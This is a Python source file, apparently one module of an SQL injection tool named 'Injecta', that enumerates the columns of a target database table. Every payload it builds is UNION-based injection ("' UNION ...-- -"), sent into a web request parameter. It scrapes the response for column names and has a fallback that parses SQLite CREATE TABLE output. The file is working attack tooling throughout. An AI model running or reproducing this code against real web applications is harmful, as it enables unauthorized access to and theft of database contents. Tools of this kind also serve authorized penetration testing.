"""
Injecta — Column enumeration
"""
from typing import Any, Dict, List, Optional


class ColumnEnumerator:
    def __init__(self, requester, config, logger, payloads, injection_info: Dict[str, Any]):
        self.req = requester
        self.config = config
        self.log = logger
        self.payloads = payloads
        self.info = injection_info

    def enumerate(self, url: str, param: str, db: str, table: str) -> List[str]:
        columns = []
        queries = self.payloads.columns(db, table)

        for q in queries:
            results = self._try_extract(url, param, q)
            if results:
                columns.extend(results)
                break

        # Fallback: parse CREATE TABLE sql for SQLite
        if not columns and hasattr(self.payloads, 'name') and self.payloads.name == 'sqlite':
            for q in self.payloads.columns(db, table):
                payload = f"' UNION {q}-- -"
                _, resp_text, _ = self.req.test_raw(url, payload, param)
                if resp_text and 'CREATE TABLE' in resp_text:
                    import re
                    cols = re.findall(r'`?(\w+)`?\s+\w+', resp_text.split('CREATE TABLE')[1].split(')')[0])
                    columns = [c for c in cols if c.lower() not in ('table', 'create', 'primary', 'key')]
                    break

        return list(set(columns))

    def _try_extract(self, url: str, param: str, sql: str) -> List[str]:
        results = []
        payload = f"' UNION {sql}-- -"
        _, resp_text, _ = self.req.test_raw(url, payload, param)
        if resp_text and len(resp_text) > 100:
            import re
            candidates = re.findall(r'(\w[\w$#@.-]+)', resp_text)
            if candidates:
                skip = {'select', 'from', 'where', 'and', 'or', 'null', 'as', 'on', 'union',
                        'column_name', 'table_name', 'information_schema', 'table_schema',
                        'ordinal_position', 'is_nullable', 'data_type', 'character_maximum_length'}
                results = [c for c in candidates if len(c) > 1 and not c.isdigit()
                          and c.lower() not in skip][:20]
        return results
